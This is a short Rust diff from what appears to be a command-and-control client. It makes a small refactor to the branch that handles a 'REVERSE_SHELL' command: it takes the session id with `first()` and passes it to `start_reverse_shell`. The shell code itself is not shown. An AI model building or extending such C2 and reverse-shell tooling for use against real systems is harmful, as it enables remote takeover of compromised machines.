@@ -178,8 +178,8 @@ impl C2Client {
         println!("Executing command: {}", cmd.command);
 
         if cmd.command == "REVERSE_SHELL" {
-            if let Some(session_id) = cmd.args.get(0) {
-                return self.start_reverse_shell(session_id.clone()).await;
+            if let Some(session_id) = cmd.args.first() {
+                return self.start_reverse_shell(session_id.clone().to_string()).await;
             } else {
                 return Err(C2Error::Other(
                     "Reverse shell command missing session_id".into(),
